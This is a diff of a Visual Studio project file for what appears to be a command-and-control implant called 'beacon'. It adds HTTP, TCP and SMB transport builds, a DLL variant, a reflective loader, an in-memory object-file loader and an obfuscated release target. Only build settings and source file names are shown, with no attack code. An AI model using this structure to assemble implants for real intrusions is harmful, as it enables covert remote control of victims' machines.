@@ -9,16 +9,20 @@
       <Configuration>Release</Configuration>
       <Platform>Win32</Platform>
     </ProjectConfiguration>
-    <ProjectConfiguration Include="DebugExe|Win32">
-      <Configuration>DebugExe</Configuration>
+    <ProjectConfiguration Include="Debug-ExHttpExe|Win32">
+      <Configuration>Debug-ExHttpExe</Configuration>
       <Platform>Win32</Platform>
     </ProjectConfiguration>
-    <ProjectConfiguration Include="DebugTCP|Win32">
-      <Configuration>DebugTCP</Configuration>
+    <ProjectConfiguration Include="Debug-InTcpExe|Win32">
+      <Configuration>Debug-InTcpExe</Configuration>
       <Platform>Win32</Platform>
     </ProjectConfiguration>
-    <ProjectConfiguration Include="DebugSMB|Win32">
-      <Configuration>DebugSMB</Configuration>
+    <ProjectConfiguration Include="Debug-InSmbExe|Win32">
+      <Configuration>Debug-InSmbExe</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug-ExTcpExe|Win32">
+      <Configuration>Debug-ExTcpExe</Configuration>
       <Platform>Win32</Platform>
     </ProjectConfiguration>
     <ProjectConfiguration Include="ReleaseExe|Win32">
@@ -33,16 +37,20 @@
       <Configuration>Release</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
-    <ProjectConfiguration Include="DebugExe|x64">
-      <Configuration>DebugExe</Configuration>
+    <ProjectConfiguration Include="Debug-ExHttpExe|x64">
+      <Configuration>Debug-ExHttpExe</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
-    <ProjectConfiguration Include="DebugTCP|x64">
-      <Configuration>DebugTCP</Configuration>
+    <ProjectConfiguration Include="Debug-InTcpExe|x64">
+      <Configuration>Debug-InTcpExe</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
-    <ProjectConfiguration Include="DebugSMB|x64">
-      <Configuration>DebugSMB</Configuration>
+    <ProjectConfiguration Include="Debug-InSmbExe|x64">
+      <Configuration>Debug-InSmbExe</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug-ExTcpExe|x64">
+      <Configuration>Debug-ExTcpExe</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
     <ProjectConfiguration Include="ReleaseExe|x64">
@@ -51,6 +59,14 @@
     </ProjectConfiguration>
     <ProjectConfiguration Include="ReleaseObf|x64">
       <Configuration>ReleaseObf</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="ReleaseDllTcpExternal|Win32">
+      <Configuration>ReleaseDllTcpExternal</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="ReleaseDllTcpExternal|x64">
+      <Configuration>ReleaseDllTcpExternal</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
   </ItemGroup>
@@ -76,19 +92,25 @@
     <CharacterSet>Unicode</CharacterSet>
     <GenerateManifest>false</GenerateManifest>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugExe|Win32'" Label="Configuration">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExHttpExe|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugTCP|Win32'" Label="Configuration">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InTcpExe|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugSMB|Win32'" Label="Configuration">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InSmbExe|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExTcpExe|Win32'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
@@ -116,19 +138,25 @@
     <CharacterSet>Unicode</CharacterSet>
     <GenerateManifest>false</GenerateManifest>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugExe|x64'" Label="Configuration">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExHttpExe|x64'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugTCP|x64'" Label="Configuration">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InTcpExe|x64'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
     <CharacterSet>Unicode</CharacterSet>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugSMB|x64'" Label="Configuration">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InSmbExe|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExTcpExe|x64'" Label="Configuration">
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
@@ -150,6 +178,22 @@
     <CharacterSet>Unicode</CharacterSet>
     <GenerateManifest>false</GenerateManifest>
   </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|Win32'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>false</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+    <GenerateManifest>false</GenerateManifest>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>false</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+    <GenerateManifest>false</GenerateManifest>
+  </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings" />
   <ImportGroup Label="Shared" />
@@ -159,13 +203,16 @@
   <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
-  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='DebugExe|Win32'">
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-ExHttpExe|Win32'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
-  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='DebugTCP|Win32'">
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-InTcpExe|Win32'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
-  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='DebugSMB|Win32'">
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-InSmbExe|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-ExTcpExe|Win32'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
   <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='ReleaseExe|Win32'">
@@ -177,13 +224,16 @@
   <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
-  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='DebugExe|x64'">
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-ExHttpExe|x64'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
-  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='DebugTCP|x64'">
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-InTcpExe|x64'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
-  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='DebugSMB|x64'">
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-InSmbExe|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug-ExTcpExe|x64'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
   <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='ReleaseExe|x64'">
@@ -192,40 +242,62 @@
   <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='ReleaseObf|x64'">
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
   <PropertyGroup Label="UserMacros" />
   <PropertyGroup Condition="'$(Platform)'=='Win32'">
     <OutDir>$(ProjectDir)x86\$(Configuration)\</OutDir>
     <IntDir>$(ProjectDir)x86\$(Configuration)\obj\</IntDir>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugExe|Win32'">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExHttpExe|Win32'">
     <GenerateManifest>false</GenerateManifest>
-    <TargetName>beacon_windows_x86</TargetName>
+    <TargetName>beacon_http_windows_x86</TargetName>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugTCP|Win32'">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InTcpExe|Win32'">
     <GenerateManifest>false</GenerateManifest>
     <InternalTransport>tcp</InternalTransport>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugSMB|Win32'">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InSmbExe|Win32'">
     <GenerateManifest>false</GenerateManifest>
     <InternalTransport>smb</InternalTransport>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugExe|x64'">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExTcpExe|Win32'">
     <GenerateManifest>false</GenerateManifest>
-    <TargetName>beacon_windows_amd64</TargetName>
+    <ExternalTransport>tcp</ExternalTransport>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugTCP|x64'">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExHttpExe|x64'">
+    <GenerateManifest>false</GenerateManifest>
+    <TargetName>beacon_http_windows_amd64</TargetName>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InTcpExe|x64'">
     <GenerateManifest>false</GenerateManifest>
     <InternalTransport>tcp</InternalTransport>
   </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='DebugSMB|x64'">
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-InSmbExe|x64'">
     <GenerateManifest>false</GenerateManifest>
     <InternalTransport>smb</InternalTransport>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug-ExTcpExe|x64'">
+    <GenerateManifest>false</GenerateManifest>
+    <ExternalTransport>tcp</ExternalTransport>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|Win32'">
+    <GenerateManifest>false</GenerateManifest>
+    <ExternalTransport>tcp</ExternalTransport>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|x64'">
+    <GenerateManifest>false</GenerateManifest>
+    <ExternalTransport>tcp</ExternalTransport>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseExe|Win32'">
-    <TargetName>beacon_windows_x86</TargetName>
+    <TargetName>beacon_http_windows_x86</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseExe|x64'">
-    <TargetName>beacon_windows_amd64</TargetName>
+    <TargetName>beacon_http_windows_amd64</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(InternalTransport)'=='tcp' and '$(Platform)'=='Win32'">
     <OutDir>$(ProjectDir)x86\$(Configuration)TcpInternal\</OutDir>
@@ -247,11 +319,29 @@
     <IntDir>$(ProjectDir)x64\$(Configuration)SmbInternal\obj\</IntDir>
     <TargetName>beacon_smb_internal_amd64</TargetName>
   </PropertyGroup>
+  <PropertyGroup Condition="'$(ExternalTransport)'=='tcp' and '$(Platform)'=='Win32'">
+    <OutDir>$(ProjectDir)x86\$(Configuration)TcpExternal\</OutDir>
+    <IntDir>$(ProjectDir)x86\$(Configuration)TcpExternal\obj\</IntDir>
+    <TargetName>beacon_tcp_windows_x86</TargetName>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(ExternalTransport)'=='tcp' and '$(Platform)'=='x64'">
+    <OutDir>$(ProjectDir)x64\$(Configuration)TcpExternal\</OutDir>
+    <IntDir>$(ProjectDir)x64\$(Configuration)TcpExternal\obj\</IntDir>
+    <TargetName>beacon_tcp_windows_amd64</TargetName>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|Win32'">
+    <OutDir>$(ProjectDir)x86\ReleaseDllTcpExternal\</OutDir>
+    <IntDir>$(ProjectDir)x86\ReleaseDllTcpExternal\obj\</IntDir>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseDllTcpExternal|x64'">
+    <OutDir>$(ProjectDir)x64\ReleaseDllTcpExternal\</OutDir>
+    <IntDir>$(ProjectDir)x64\ReleaseDllTcpExternal\obj\</IntDir>
+  </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
-    <TargetName>Beacon_x86</TargetName>
+    <TargetName>beacon_http_windows_x86</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
-    <TargetName>Beacon_amd64</TargetName>
+    <TargetName>beacon_http_windows_amd64</TargetName>
   </PropertyGroup>
   <ItemDefinitionGroup>
     <ClCompile>
@@ -269,9 +359,9 @@
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
-      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
       <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
-      <AdditionalDependencies>kernel32.lib;advapi32.lib;bcrypt.lib;iphlpapi.lib;ws2_32.lib;winhttp.lib;user32.lib;gdi32.lib;ole32.lib;oleaut32.lib;windowscodecs.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>kernel32.lib;advapi32.lib;bcrypt.lib;iphlpapi.lib;ws2_32.lib;winhttp.lib;secur32.lib;user32.lib;gdi32.lib;ole32.lib;oleaut32.lib;windowscodecs.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)'=='Debug'">
@@ -284,7 +374,7 @@
       <AdditionalDependencies>libcmtd.lib;libvcruntimed.lib;libucrtd.lib;oldnames.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
-  <ItemDefinitionGroup Condition="'$(Configuration)'=='DebugExe'">
+  <ItemDefinitionGroup Condition="'$(Configuration)'=='Debug-ExHttpExe'">
     <ClCompile>
       <PreprocessorDefinitions>_DEBUG;_WINDOWS;BEACON_EXE_BUILD;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <BasicRuntimeChecks>Default</BasicRuntimeChecks>
@@ -294,7 +384,7 @@
       <AdditionalDependencies>libcmtd.lib;libvcruntimed.lib;libucrtd.lib;oldnames.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
-  <ItemDefinitionGroup Condition="'$(Configuration)'=='DebugTCP' Or '$(Configuration)'=='DebugSMB'">
+  <ItemDefinitionGroup Condition="'$(Configuration)'=='Debug-InTcpExe' Or '$(Configuration)'=='Debug-InSmbExe' Or '$(Configuration)'=='Debug-ExTcpExe'">
     <ClCompile>
       <PreprocessorDefinitions>_DEBUG;_WINDOWS;BEACON_EXE_BUILD;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <BasicRuntimeChecks>Default</BasicRuntimeChecks>
@@ -327,6 +417,25 @@
       </EntryPointSymbol>
     </Link>
   </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)'=='ReleaseDllTcpExternal'">
+    <ClCompile>
+      <PreprocessorDefinitions>NDEBUG;_WINDOWS;BEACON_DLL_BUILD;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <Optimization>MinSpace</Optimization>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <InlineFunctionExpansion>OnlyExplicitInline</InlineFunctionExpansion>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <StringPooling>true</StringPooling>
+      <DebugInformationFormat>None</DebugInformationFormat>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>libcmt.lib;libvcruntime.lib;libucrt.lib;oldnames.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <OptimizeReferences>true</OptimizeReferences>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <GenerateManifest>false</GenerateManifest>
+    </Link>
+  </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)'=='ReleaseExe'">
     <ClCompile>
       <PreprocessorDefinitions>NDEBUG;_WINDOWS;BEACON_EXE_BUILD;%(PreprocessorDefinitions)</PreprocessorDefinitions>
@@ -356,6 +465,11 @@
       <PreprocessorDefinitions>BEACON_INTERNAL_SMB_BUILD;%(PreprocessorDefinitions)</PreprocessorDefinitions>
     </ClCompile>
   </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(ExternalTransport)'=='tcp'">
+    <ClCompile>
+      <PreprocessorDefinitions>BEACON_EXTERNAL_TCP_BUILD;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+  </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseObf|x64'">
     <ClCompile>
       <PreprocessorDefinitions>NDEBUG;_WINDOWS;BEACON_DLL_BUILD;BEACON_OBF_BUILD;%(PreprocessorDefinitions)</PreprocessorDefinitions>
@@ -381,6 +495,11 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="src\beacon.c" />
+    <ClCompile Include="src\bof\bof_entry.c" />
+    <ClCompile Include="src\bof\bof_loader.c" />
+    <ClCompile Include="src\bof\bof_resolve.c" />
+    <ClCompile Include="src\bof\bof_runtime.c" />
+    <ClCompile Include="src\bof\bof_util.c" />
     <ClCompile Include="src\commands\command_attr.c" />
     <ClCompile Include="src\commands\command_beacon_api.c" />
     <ClCompile Include="src\commands\command_bof.c" />
@@ -393,6 +512,10 @@
     <ClCompile Include="src\commands\command_zip.c" />
     <ClCompile Include="src\commands\dispatcher.c" />
     <ClCompile Include="src\core\agent.c" />
+    <ClCompile Include="src\core\agent_common.c" />
+    <ClCompile Include="src\core\agent_http.c" />
+    <ClCompile Include="src\core\agent_internal.c" />
+    <ClCompile Include="src\core\agent_tcp_external.c" />
     <ClCompile Include="src\core\api.c" />
     <ClCompile Include="src\core\common.c" />
     <ClCompile Include="src\core\context.c" />
@@ -405,16 +528,29 @@
     <ClCompile Include="src\core\sysinfo.c" />
     <ClCompile Include="src\loader\reflective_loader.c" />
     <ClCompile Include="src\managers\cascade.c" />
+    <ClCompile Include="src\managers\cascade_channel.c" />
+    <ClCompile Include="src\managers\cascade_frame.c" />
+    <ClCompile Include="src\managers\cascade_io.c" />
+    <ClCompile Include="src\managers\cascade_io_smb.c" />
+    <ClCompile Include="src\managers\cascade_io_tcp.c" />
     <ClCompile Include="src\managers\jobs.c" />
     <ClCompile Include="src\managers\tunnel.c" />
     <ClCompile Include="src\managers\transfer.c" />
-    <ClCompile Include="src\transport\http.c" />
+    <ClCompile Include="src\transport\http_external.c">
+      <ExcludedFromBuild Condition="'$(ExternalTransport)'=='tcp'">true</ExcludedFromBuild>
+    </ClCompile>
+    <ClCompile Include="src\transport\tcp_external.c">
+      <ExcludedFromBuild Condition="'$(ExternalTransport)'!='tcp'">true</ExcludedFromBuild>
+    </ClCompile>
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="include\beacon_agent.h" />
+    <ClInclude Include="include\beacon_agent_internal.h" />
     <ClInclude Include="include\beacon_api.h" />
     <ClInclude Include="include\beacon_bof.h" />
+    <ClInclude Include="include\beacon_bof_internal.h" />
     <ClInclude Include="include\beacon_cascade.h" />
+    <ClInclude Include="include\beacon_cascade_internal.h" />
     <ClInclude Include="include\beacon_commands.h" />
     <ClInclude Include="include\beacon_common.h" />
     <ClInclude Include="include\beacon_context.h" />
